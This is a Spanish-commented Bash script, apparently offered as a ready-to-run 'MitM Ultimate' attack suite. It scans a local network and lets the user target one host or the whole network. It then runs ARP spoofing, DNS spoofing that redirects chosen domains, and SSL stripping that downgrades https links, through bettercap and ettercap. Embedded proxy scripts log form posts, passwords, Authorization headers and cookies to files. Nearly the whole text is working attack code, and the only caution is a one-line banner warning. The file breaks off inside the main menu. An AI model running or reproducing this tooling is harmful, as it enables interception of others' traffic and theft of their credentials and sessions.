#!/bin/bash

# 🕳️ MitM ULTIMATE SCANNER
# Man in the Middle: ARP spoofing, SSL stripping, DNS spoofing, captura de credenciales

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
INTERFACE=""
TARGET_IP=""
GATEWAY_IP=""
ATTACK_TYPE=""
OUTPUT_DIR=""
CAPTURE_HTTPS=""
DNS_SPOOFING=""

print_banner() {
    clear
    echo -e "${RED}"
    echo "███╗   ███╗██╗████████╗███╗   ███╗    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗"
    echo "████╗ ████║██║╚══██╔══╝████╗ ████║    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝"
    echo "██╔████╔██║██║   ██║   ██╔████╔██║    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  "
    echo "██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  "
    echo "██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗"
    echo "╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}🕳️ MitM Ultimate - Man in the Middle Attack Suite${NC}"
    echo -e "${YELLOW}⚠️  Solo usar en redes propias o con autorización${NC}"
    echo ""
}

check_interface() {
    echo -e "${YELLOW}🔍 Detectando interface de red...${NC}"
    
    # Detectar interface activa con conexión a internet
    local default_interface=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $5; exit}')
    
    if [[ -n "$default_interface" ]]; then
        echo -e "${GREEN}✅ Interface detectada: $default_interface${NC}"
        INTERFACE="$default_interface"
    else
        echo -e "${CYAN}📡 Interfaces disponibles:${NC}"
        ip link show | grep -E "^[0-9]+: [a-z]" | grep -v "lo:" | while read line; do
            local iface=$(echo "$line" | cut -d':' -f2 | cut -d'@' -f1 | sed 's/ //g')
            local status=$(echo "$line" | grep -o "state [A-Z]*" | cut -d' ' -f2)
            echo -e "  • $iface (Estado: $status)"
        done
        
        read -p "🎯 Selecciona interface: " INTERFACE
    fi
    
    # Verificar que la interface existe
    if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
        echo -e "${RED}❌ Interface $INTERFACE no encontrada${NC}"
        return 1
    fi
    
    # Obtener información de red
    get_network_info
}

get_network_info() {
    echo -e "${CYAN}📊 Obteniendo información de red...${NC}"
    
    # IP local
    local local_ip=$(ip addr show "$INTERFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
    
    # Gateway
    GATEWAY_IP=$(ip route | grep "default" | grep "$INTERFACE" | awk '{print $3}')
    
    # Red
    local network=$(ip route | grep "$INTERFACE" | grep -E "192\.168\.|10\.|172\." | head -1 | awk '{print $1}')
    
    echo -e "${GREEN}📍 Información de red:${NC}"
    echo -e "  🏠 Tu IP: ${CYAN}$local_ip${NC}"
    echo -e "  🌐 Gateway: ${CYAN}$GATEWAY_IP${NC}"
    echo -e "  📡 Red: ${CYAN}$network${NC}"
}

scan_network() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}         ${YELLOW}ESCANEO DE RED LOCAL${NC}           ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    # Detectar rango de red
    local network=$(ip route | grep "$INTERFACE" | grep -E "192\.168\.|10\.|172\." | head -1 | awk '{print $1}')
    
    if [[ -z "$network" ]]; then
        read -p "🌐 Ingresa rango de red (ej: 192.168.1.0/24): " network
    fi
    
    echo -e "${CYAN}🔍 Escaneando red: $network${NC}"
    echo -e "${YELLOW}⏳ Esto puede tomar unos minutos...${NC}"
    
    # Escanear con nmap
    local scan_file="/tmp/mitm_scan_$(date +%H%M%S).txt"
    
    if command -v nmap &> /dev/null; then
        nmap -sn "$network" | grep -E "Nmap scan report|MAC Address" | sed 'N;s/\n/ /' > "$scan_file"
    else
        echo -e "${YELLOW}⚠️ nmap no disponible, usando ping...${NC}"
        # Ping sweep básico
        local base_ip=$(echo "$network" | cut -d'.' -f1-3)
        for i in {1..254}; do
            ping -c 1 -W 1 "$base_ip.$i" >/dev/null 2>&1 && echo "Host: $base_ip.$i" >> "$scan_file" &
        done
        wait
    fi
    
    # Procesar resultados
    if [[ -f "$scan_file" && -s "$scan_file" ]]; then
        echo -e "\n${GREEN}👥 Hosts encontrados en la red:${NC}"
        echo -e "${BLUE}ID  IP Address        Hostname/MAC${NC}"
        echo -e "${BLUE}──  ────────────────  ─────────────────────────${NC}"
        
        local counter=1
        declare -A hosts_map
        
        while read -r line; do
            if [[ "$line" == *"Nmap scan report"* ]]; then
                local ip=$(echo "$line" | awk '{print $NF}' | tr -d '()')
                local hostname=$(echo "$line" | awk '{if (NF > 5) print $(NF-1); else print "Unknown"}')
                
                printf "${CYAN}%2d${NC}  %-16s  %-25s\n" "$counter" "$ip" "$hostname"
                hosts_map["$counter"]="$ip"
                ((counter++))
            elif [[ "$line" == *"Host:"* ]]; then
                local ip=$(echo "$line" | awk '{print $2}')
                printf "${CYAN}%2d${NC}  %-16s  %-25s\n" "$counter" "$ip" "Unknown"
                hosts_map["$counter"]="$ip"
                ((counter++))
            fi
        done < "$scan_file"
        
        if [[ $counter -eq 1 ]]; then
            echo -e "${YELLOW}⚠️ No se encontraron hosts${NC}"
            return 1
        fi
        
        echo ""
        echo -e "${YELLOW}Opciones de objetivo:${NC}"
        echo -e "  ${CYAN}0.${NC} IP específica"
        echo -e "  ${CYAN}99.${NC} Atacar toda la red"
        echo ""
        
        read -p "🎯 Selecciona objetivo (0-$((counter-1)), 99): " target_choice
        
        if [[ "$target_choice" == "0" ]]; then
            read -p "🎯 IP específica: " TARGET_IP
        elif [[ "$target_choice" == "99" ]]; then
            TARGET_IP="ALL"
            echo -e "${RED}⚠️ Ataque masivo seleccionado${NC}"
        elif [[ -n "${hosts_map[$target_choice]}" ]]; then
            TARGET_IP="${hosts_map[$target_choice]}"
            echo -e "${GREEN}✅ Objetivo seleccionado: $TARGET_IP${NC}"
        else
            echo -e "${RED}❌ Selección inválida${NC}"
            return 1
        fi
    else
        echo -e "${YELLOW}⚠️ No se encontraron hosts${NC}"
        read -p "🎯 Ingresa IP objetivo manualmente: " TARGET_IP
    fi
    
    rm -f "$scan_file"
}

select_attack_type() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}         ${YELLOW}TIPO DE ATAQUE MitM${NC}            ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué tipo de ataque MitM quieres ejecutar?${NC}"
    echo -e "  ${CYAN}1.${NC} 🔄 ARP Spoofing sobre WiFi ${PURPLE}[bettercap]${NC}"
    echo -e "  ${CYAN}2.${NC} 🌐 DNS Spoofing ${PURPLE}[ettercap]${NC}"
    echo -e "  ${CYAN}3.${NC} 🔓 SSL Stripping ${PURPLE}[bettercap]${NC}"
    echo -e "  ${CYAN}4.${NC} 📦 Captura de credenciales HTTP ${PURPLE}[ettercap]${NC}"
    echo -e "  ${CYAN}5.${NC} 🕳️ Ataque MitM completo ${PURPLE}[todos los métodos]${NC}"
    echo -e "  ${CYAN}6.${NC} ⚙️ Configuración personalizada"
    echo ""
    
    read -p "Selecciona ataque (1-6): " attack_choice
    
    case $attack_choice in
        1)
            ATTACK_TYPE="arp_spoofing"
            echo -e "${GREEN}✅ ARP Spoofing seleccionado${NC}"
            ;;
        2)
            ATTACK_TYPE="dns_spoofing"
            echo -e "${GREEN}✅ DNS Spoofing seleccionado${NC}"
            configure_dns_spoofing
            ;;
        3)
            ATTACK_TYPE="ssl_stripping"
            echo -e "${GREEN}✅ SSL Stripping seleccionado${NC}"
            ;;
        4)
            ATTACK_TYPE="credential_capture"
            echo -e "${GREEN}✅ Captura de credenciales${NC}"
            ;;
        5)
            ATTACK_TYPE="complete_mitm"
            echo -e "${GREEN}✅ Ataque MitM completo${NC}"
            ;;
        6)
            select_custom_config
            ;;
        *)
            echo -e "${YELLOW}Usando ARP Spoofing por defecto${NC}"
            ATTACK_TYPE="arp_spoofing"
            ;;
    esac
}

configure_dns_spoofing() {
    echo -e "\n${CYAN}🌐 Configuración de DNS Spoofing:${NC}"
    
    read -p "🎯 Dominio a interceptar (ej: facebook.com): " target_domain
    read -p "🔗 IP de redirección (tu servidor): " redirect_ip
    
    if [[ -z "$redirect_ip" ]]; then
        redirect_ip=$(ip addr show "$INTERFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
        echo -e "${YELLOW}Usando tu IP local: $redirect_ip${NC}"
    fi
    
    # Guardar configuración
    echo "TARGET_DOMAIN=$target_domain" > "/tmp/dns_spoof_config"
    echo "REDIRECT_IP=$redirect_ip" >> "/tmp/dns_spoof_config"
    
    echo -e "${GREEN}✅ DNS Spoofing configurado:${NC}"
    echo -e "  🎯 Dominio: ${CYAN}$target_domain${NC}"
    echo -e "  🔗 Redirige a: ${CYAN}$redirect_ip${NC}"
}

select_custom_config() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}      ${YELLOW}CONFIGURACIÓN PERSONALIZADA${NC}      ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}Configuración avanzada:${NC}"
    
    # Seleccionar múltiples ataques
    echo -e "\n${CYAN}🎯 Ataques a combinar:${NC}"
    read -p "¿Incluir ARP spoofing? (Y/n): " include_arp
    read -p "¿Incluir DNS spoofing? (y/N): " include_dns
    read -p "¿Incluir SSL stripping? (y/N): " include_ssl
    read -p "¿Capturar credenciales? (Y/n): " capture_creds
    
    # Configuración de captura
    echo -e "\n${CYAN}📦 Configuración de captura:${NC}"
    read -p "¿Capturar tráfico HTTPS? (y/N): " CAPTURE_HTTPS
    read -p "¿Guardar imágenes? (y/N): " capture_images
    read -p "¿Interceptar formularios? (Y/n): " capture_forms
    
    # Configuración de evasión
    echo -e "\n${CYAN}🥷 Opciones de evasión:${NC}"
    read -p "¿Usar MAC spoofing? (y/N): " use_mac_spoof
    read -p "¿Rotar user agents? (y/N): " rotate_agents
    
    ATTACK_TYPE="custom"
    
    # Guardar configuración personalizada
    cat > "/tmp/mitm_custom_config" << EOF
INCLUDE_ARP=$include_arp
INCLUDE_DNS=$include_dns
INCLUDE_SSL=$include_ssl
CAPTURE_CREDS=$capture_creds
CAPTURE_HTTPS=$CAPTURE_HTTPS
CAPTURE_IMAGES=$capture_images
CAPTURE_FORMS=$capture_forms
USE_MAC_SPOOF=$use_mac_spoof
ROTATE_AGENTS=$rotate_agents
EOF
    
    echo -e "${GREEN}✅ Configuración personalizada guardada${NC}"
}

setup_output_directory() {
    OUTPUT_DIR="mitm_attack_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{logs,captures,credentials,configs,images}
    
    echo -e "${GREEN}📁 Directorio creado: $OUTPUT_DIR${NC}"
    
    # Crear archivo de información
    cat > "$OUTPUT_DIR/attack_info.txt" << EOF
# MitM Attack Info - $(date)
Interface: $INTERFACE
Target IP: $TARGET_IP
Gateway IP: $GATEWAY_IP
Attack Type: $ATTACK_TYPE
Started: $(date)
EOF
}

setup_prerequisites() {
    echo -e "${CYAN}🔧 Configurando prerrequisitos...${NC}"
    
    # Habilitar IP forwarding
    echo '1' | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null
    echo -e "${GREEN}✅ IP forwarding habilitado${NC}"
    
    # Configurar iptables para captura
    sudo iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
    sudo iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT
    
    echo -e "${GREEN}✅ iptables configurado${NC}"
}

execute_arp_spoofing() {
    echo -e "\n${YELLOW}🔄 Ejecutando ARP Spoofing...${NC}"
    
    if ! command -v bettercap &> /dev/null; then
        if ! command -v ettercap &> /dev/null; then
            echo -e "${RED}❌ Ni bettercap ni ettercap están disponibles${NC}"
            echo -e "${YELLOW}💡 Instala con: sudo apt install bettercap ettercap-text-only${NC}"
            return 1
        else
            execute_ettercap_arp_spoofing
            return
        fi
    fi
    
    local bettercap_log="$OUTPUT_DIR/logs/bettercap_arp.log"
    
    echo -e "${CYAN}🚀 Iniciando bettercap para ARP spoofing...${NC}"
    
    # Crear script de bettercap
    local caplet_file="$OUTPUT_DIR/configs/arp_spoof.cap"
    
    if [[ "$TARGET_IP" == "ALL" ]]; then
        cat > "$caplet_file" << EOF
# ARP spoofing para toda la red
set arp.spoof.fullduplex true
set arp.spoof.targets $GATEWAY_IP/24
arp.spoof on
EOF
    else
        cat > "$caplet_file" << EOF
# ARP spoofing para objetivo específico
set arp.spoof.fullduplex true
set arp.spoof.targets $TARGET_IP
arp.spoof on
EOF
    fi
    
    echo -e "${BLUE}🎯 Objetivo: ${TARGET_IP}${NC}"
    echo -e "${YELLOW}⏳ Ejecutando ARP spoofing (Ctrl+C para detener)...${NC}"
    
    # Ejecutar bettercap
    sudo bettercap -iface "$INTERFACE" -caplet "$caplet_file" 2>&1 | tee "$bettercap_log" || true
    
    echo -e "${GREEN}✅ ARP spoofing completado${NC}"
}

execute_ettercap_arp_spoofing() {
    echo -e "${CYAN}🔧 Usando ettercap para ARP spoofing...${NC}"
    
    local ettercap_log="$OUTPUT_DIR/logs/ettercap_arp.log"
    
    if [[ "$TARGET_IP" == "ALL" ]]; then
        echo -e "${YELLOW}⏳ ARP spoofing a toda la red...${NC}"
        sudo ettercap -T -M arp:remote -i "$INTERFACE" // // 2>&1 | tee "$ettercap_log" || true
    else
        echo -e "${YELLOW}⏳ ARP spoofing a $TARGET_IP...${NC}"
        sudo ettercap -T -M arp:remote -i "$INTERFACE" /$GATEWAY_IP// /$TARGET_IP// 2>&1 | tee "$ettercap_log" || true
    fi
}

execute_dns_spoofing() {
    echo -e "\n${YELLOW}🌐 Ejecutando DNS Spoofing...${NC}"
    
    # Cargar configuración
    if [[ -f "/tmp/dns_spoof_config" ]]; then
        source "/tmp/dns_spoof_config"
    else
        echo -e "${RED}❌ Configuración DNS no encontrada${NC}"
        return 1
    fi
    
    if ! command -v bettercap &> /dev/null; then
        echo -e "${RED}❌ bettercap requerido para DNS spoofing${NC}"
        return 1
    fi
    
    # Crear caplet de DNS spoofing
    local dns_caplet="$OUTPUT_DIR/configs/dns_spoof.cap"
    
    cat > "$dns_caplet" << EOF
# DNS Spoofing configuration
set dns.spoof.domains $TARGET_DOMAIN
set dns.spoof.address $REDIRECT_IP
set dns.spoof.all true

# Iniciar ARP spoofing
set arp.spoof.fullduplex true
set arp.spoof.targets $TARGET_IP
arp.spoof on

# Iniciar DNS spoofing
dns.spoof on
EOF
    
    echo -e "${CYAN}🌐 Configuración DNS Spoofing:${NC}"
    echo -e "  🎯 Dominio: ${CYAN}$TARGET_DOMAIN${NC}"
    echo -e "  🔗 Redirige a: ${CYAN}$REDIRECT_IP${NC}"
    
    echo -e "${YELLOW}⏳ Ejecutando DNS spoofing (Ctrl+C para detener)...${NC}"
    
    # Ejecutar bettercap con DNS spoofing
    sudo bettercap -iface "$INTERFACE" -caplet "$dns_caplet" 2>&1 | tee "$OUTPUT_DIR/logs/dns_spoof.log" || true
    
    echo -e "${GREEN}✅ DNS spoofing completado${NC}"
}

execute_ssl_stripping() {
    echo -e "\n${YELLOW}🔓 Ejecutando SSL Stripping...${NC}"
    
    if ! command -v bettercap &> /dev/null; then
        echo -e "${RED}❌ bettercap requerido para SSL stripping${NC}"
        return 1
    fi
    
    # Crear caplet SSL stripping
    local ssl_caplet="$OUTPUT_DIR/configs/ssl_strip.cap"
    
    cat > "$ssl_caplet" << EOF
# SSL Stripping con HTTP proxy
set http.proxy.address 0.0.0.0
set http.proxy.port 8080
set http.proxy.script $OUTPUT_DIR/configs/ssl_strip.js
http.proxy on

# ARP spoofing
set arp.spoof.fullduplex true
set arp.spoof.targets $TARGET_IP
arp.spoof on

# Redirección HTTPS -> HTTP
set https.redirect.port 443
https.redirect on
EOF
    
    # Crear script JavaScript para SSL stripping
    cat > "$OUTPUT_DIR/configs/ssl_strip.js" << 'EOF'
function onRequest(req, res) {
    console.log('[' + new Date().toISOString() + '] ' + req.Method + ' ' + req.URL);
    
    // Log credentials if present
    if (req.Method == 'POST') {
        try {
            var body = req.ReadBody();
            if (body.length > 0) {
                console.log('[CREDENTIALS] ' + body);
            }
        } catch (e) {}
    }
}

function onResponse(req, res) {
    // Strip HTTPS from response
    if (res.ContentType.indexOf('text/html') >= 0) {
        var body = res.ReadBody();
        body = body.replace(/https:/g, 'http:');
        res.Body = body;
    }
}
EOF
    
    echo -e "${CYAN}🔓 Configurando SSL stripping...${NC}"
    echo -e "${YELLOW}⏳ Ejecutando SSL stripping (Ctrl+C para detener)...${NC}"
    
    # Configurar iptables para redireccionar HTTPS
    sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
    
    # Ejecutar bettercap
    sudo bettercap -iface "$INTERFACE" -caplet "$ssl_caplet" 2>&1 | tee "$OUTPUT_DIR/logs/ssl_strip.log" || true
    
    # Limpiar iptables
    sudo iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080 2>/dev/null || true
    
    echo -e "${GREEN}✅ SSL stripping completado${NC}"
}

execute_credential_capture() {
    echo -e "\n${YELLOW}📦 Configurando captura de credenciales...${NC}"
    
    if ! command -v bettercap &> /dev/null; then
        echo -e "${YELLOW}⚠️ bettercap no disponible, usando tcpdump...${NC}"
        execute_tcpdump_capture
        return
    fi
    
    # Crear caplet para captura de credenciales
    local cred_caplet="$OUTPUT_DIR/configs/credential_capture.cap"
    
    cat > "$cred_caplet" << EOF
# Captura de credenciales HTTP
set http.proxy.address 0.0.0.0
set http.proxy.port 8080
set http.proxy.script $OUTPUT_DIR/configs/cred_capture.js
http.proxy on

# Sniffer de red
set net.sniff.verbose false
set net.sniff.local true
set net.sniff.output $OUTPUT_DIR/captures/traffic.pcap
net.sniff on

# ARP spoofing
set arp.spoof.fullduplex true
set arp.spoof.targets $TARGET_IP
arp.spoof on
EOF
    
    # Crear script de captura de credenciales
    cat > "$OUTPUT_DIR/configs/cred_capture.js" << 'EOF'
function onRequest(req, res) {
    var timestamp = new Date().toISOString();
    var logEntry = '[' + timestamp + '] ' + req.RemoteAddr + ' -> ' + req.Method + ' ' + req.URL + '\n';
    
    // Capturar formularios POST
    if (req.Method == 'POST' && req.ContentType.indexOf('application/x-www-form-urlencoded') >= 0) {
        try {
            var body = req.ReadBody();
            if (body.length > 0) {
                logEntry += '[FORM DATA] ' + body + '\n';
                
                // Buscar patrones de credenciales
                if (body.match(/(username|user|email|login|passwd|password|pass)/i)) {
                    logEntry += '[POTENTIAL CREDENTIALS] ' + body + '\n';
                }
            }
        } catch (e) {}
    }
    
    // Capturar headers de autenticación
    var authHeader = req.Header('Authorization');
    if (authHeader && authHeader.length > 0) {
        logEntry += '[AUTH HEADER] ' + authHeader + '\n';
    }
    
    log(logEntry);
}

function onResponse(req, res) {
    // Log cookies
    var cookies = res.Header('Set-Cookie');
    if (cookies && cookies.length > 0) {
        log('[COOKIES] ' + req.URL + ' -> ' + cookies + '\n');
    }
}
EOF
    
    echo -e "${CYAN}📦 Iniciando captura de credenciales...${NC}"
    echo -e "${YELLOW}⏳ Monitoreando tráfico (Ctrl+C para detener)...${NC}"
    
    # Configurar redirección HTTP
    sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
    
    # Ejecutar bettercap
    sudo bettercap -iface "$INTERFACE" -caplet "$cred_caplet" 2>&1 | tee "$OUTPUT_DIR/logs/credential_capture.log" || true
    
    # Limpiar iptables
    sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    
    echo -e "${GREEN}✅ Captura de credenciales completada${NC}"
}

execute_tcpdump_capture() {
    echo -e "${CYAN}📦 Usando tcpdump para captura...${NC}"
    
    local pcap_file="$OUTPUT_DIR/captures/traffic_$(date +%H%M%S).pcap"
    
    echo -e "${YELLOW}⏳ Capturando tráfico con tcpdump...${NC}"
    
    # Capturar HTTP y HTTPS
    sudo tcpdump -i "$INTERFACE" -w "$pcap_file" \
        'port 80 or port 443 or port 8080' \
        2>&1 | tee "$OUTPUT_DIR/logs/tcpdump.log" || true
    
    # Analizar captura básica
    if [[ -f "$pcap_file" ]]; then
        echo -e "${CYAN}📊 Analizando captura...${NC}"
        
        # Extraer URLs HTTP
        if command -v tshark &> /dev/null; then
            tshark -r "$pcap_file" -Y "http.request" -T fields -e http.host -e http.request.uri \
                > "$OUTPUT_DIR/captures/http_requests.txt" 2>/dev/null || true
        fi
        
        echo -e "${GREEN}✅ Captura guardada en: $pcap_file${NC}"
    fi
}

execute_complete_mitm() {
    echo -e "\n${YELLOW}🕳️ Ejecutando ataque MitM completo...${NC}"
    
    echo -e "${BLUE}Fase 1: ARP Spoofing...${NC}"
    execute_arp_spoofing &
    local arp_pid=$!
    
    sleep 10
    
    echo -e "\n${BLUE}Fase 2: Captura de credenciales...${NC}"
    execute_credential_capture &
    local cred_pid=$!
    
    echo -e "\n${BLUE}Fase 3: Monitoreo activo...${NC}"
    monitor_mitm_attack &
    local monitor_pid=$!
    
    echo -e "${GREEN}🎯 Ataque MitM completo activo${NC}"
    echo -e "${YELLOW}⏳ Presiona Ctrl+C para detener todos los ataques...${NC}"
    
    # Esperar interrupción
    trap "cleanup_mitm_processes $arp_pid $cred_pid $monitor_pid" INT
    wait
}

monitor_mitm_attack() {
    local creds_file="$OUTPUT_DIR/logs/credential_capture.log"
    
    while true; do
        if [[ -f "$creds_file" ]]; then
            # Buscar nuevas credenciales
            local new_creds=$(tail -n 50 "$creds_file" 2>/dev/null | grep -i "POTENTIAL CREDENTIALS\|AUTH HEADER\|FORM DATA")
            
            if [[ -n "$new_creds" ]]; then
                echo -e "\n${GREEN}🎣 NUEVAS CAPTURAS DETECTADAS:${NC}"
                echo "$new_creds" | tail -5
                echo ""
            fi
        fi
        
        sleep 15
    done
}

cleanup_mitm_processes() {
    echo -e "\n${YELLOW}🧹 Deteniendo ataques MitM...${NC}"
    
    # Matar procesos específicos
    for pid in "$@"; do
        if [[ -n "$pid" ]]; then
            kill "$pid" 2>/dev/null || true
        fi
    done
    
    # Matar bettercap y ettercap
    sudo pkill bettercap 2>/dev/null || true
    sudo pkill ettercap 2>/dev/null || true
    
    # Restaurar iptables
    sudo iptables -F
    sudo iptables -t nat -F
    
    # Deshabilitar IP forwarding
    echo '0' | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null
    
    echo -e "${GREEN}✅ Limpieza completada${NC}"
}

analyze_captured_data() {
    echo -e "\n${CYAN}📊 Analizando datos capturados...${NC}"
    
    # Analizar logs de credenciales
    local creds_file="$OUTPUT_DIR/logs/credential_capture.log"
    if [[ -f "$creds_file" ]]; then
        local cred_count=$(grep -c "POTENTIAL CREDENTIALS" "$creds_file" 2>/dev/null || echo "0")
        local form_count=$(grep -c "FORM DATA" "$creds_file" 2>/dev/null || echo "0")
        local auth_count=$(grep -c "AUTH HEADER" "$creds_file" 2>/dev/null || echo "0")
        
        echo -e "  🔑 Credenciales potenciales: ${CYAN}$cred_count${NC}"
        echo -e "  📝 Formularios capturados: ${CYAN}$form_count${NC}"
        echo -e "  🔐 Headers de autenticación: ${CYAN}$auth_count${NC}"
    fi
    
    # Analizar capturas de red
    local pcap_files=$(find "$OUTPUT_DIR/captures" -name "*.pcap" 2>/dev/null)
    if [[ -n "$pcap_files" ]]; then
        echo -e "\n${CYAN}📦 Archivos de captura encontrados:${NC}"
        for pcap in $pcap_files; do
            local size=$(du -h "$pcap" 2>/dev/null | cut -f1)
            echo -e "  📄 $(basename "$pcap") ($size)"
        done
    fi
    
    # Crear resumen
    {
        echo "=== MitM ATTACK SUMMARY - $(date) ==="
        echo "Target: $TARGET_IP"
        echo "Gateway: $GATEWAY_IP"
        echo "Attack Type: $ATTACK_TYPE"
        echo "Credentials captured: $cred_count"
        echo "Forms intercepted: $form_count"
        echo "Auth headers: $auth_count"
    } > "$OUTPUT_DIR/attack_summary.txt"
}

show_attack_summary() {
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}                        ${YELLOW}RESUMEN DEL ATAQUE${NC}                             ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${CYAN}📁 Directorio del proyecto: $OUTPUT_DIR${NC}"
    
    if [[ -n "$TARGET_IP" ]]; then
        echo -e "\n${GREEN}🎯 Ataque MitM ejecutado:${NC}"
        echo -e "  🎯 Objetivo: $TARGET_IP"
        echo -e "  🌐 Gateway: $GATEWAY_IP"
        echo -e "  🔧 Tipo: $ATTACK_TYPE"
    fi
    
    # Analizar resultados
    analyze_captured_data
    
    # Mostrar archivos generados
    echo -e "\n${CYAN}📊 Archivos generados:${NC}"
    find "$OUTPUT_DIR" -type f 2>/dev/null | while read file; do
        local size=$(du -h "$file" 2>/dev/null | cut -f1)
        local rel_path=${file#$OUTPUT_DIR/}
        echo -e "  📄 $rel_path ($size)"
    done
    
    # Mostrar credenciales si existen
    local creds_file="$OUTPUT_DIR/logs/credential_capture.log"
    if [[ -f "$creds_file" ]]; then
        local recent_creds=$(grep -i "POTENTIAL CREDENTIALS" "$creds_file" 2>/dev/null | tail -5)
        if [[ -n "$recent_creds" ]]; then
            echo -e "\n${GREEN}🔑 Últimas credenciales capturadas:${NC}"
            echo "$recent_creds"
        fi
    fi
}

main_menu() {
    while true; do
        print_banner
        
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}                         ${YELLOW}MENÚ PRINCIPAL${NC}                               ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}1.${NC}  🔧 Configurar Interface de Red                                 ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}2.${NC}  🔍 Escanear Red Local                                          ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}3.${NC}  🔄 ARP Spoofing                                                ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}4.${NC}  🌐 DNS Spoofing                                                ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}5.${NC}  🔓 SSL Stripping                                               ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}6.${NC}  📦 Captura de Credenciales                                     ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}7.${NC}  🕳️ Ataque MitM Completo                                        ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}8.${NC}  📊 Ver Datos Capturados                                        ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}9.${NC}  📈 Ver Resumen de Resultados                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}0.${NC}  🚪 Salir                                                        ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        if [[ -n "$INTERFACE" ]]; then
            echo -e "\n${GREEN}📡 Interface: $INTERFACE${NC}"
        fi
        
        if [[ -n "$TARGET_IP" ]]; then
            echo -e "${GREEN}🎯 Objetivo: $TARGET_IP${NC}"
        fi
        
        if [[ -n "$GATEWAY_IP" ]]; then
            echo -e "${GREEN}🌐 Gateway: $GATEWAY_IP${NC}"
        fi
        
        echo ""
        read -p "Selecciona una opción (0-9): " choice
        
        case $choice in
            1) check_interface ;;
            2) 
                [[ -z "$INTERFACE" ]] && check_interface
                scan_network
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_IP" ]] && scan_network
                ATTACK_TYPE="arp_spoofing"
                setup_output_directory
                setup_prerequisites
                execute_arp_spoofing
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_IP" ]] && scan_network
                ATTACK_TYPE="dns_spoofing"
                configure_dns_spoofing
                setup_output_directory
                setup_prerequisites
                execute_dns_spoofing
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            5)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_IP" ]] && scan_network
                ATTACK_TYPE="ssl_stripping"
                setup_output_directory
                setup_prerequisites
                execute_ssl_stripping
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_IP" ]] && scan_network
                ATTACK_TYPE="credential_capture"
                setup_output_directory
                setup_prerequisites
                execute_credential_capture
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_IP" ]] && scan_network
                ATTACK_TYPE="complete_mitm"
                setup_output_directory
                setup_prerequisites
                execute_complete_mitm
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            8)
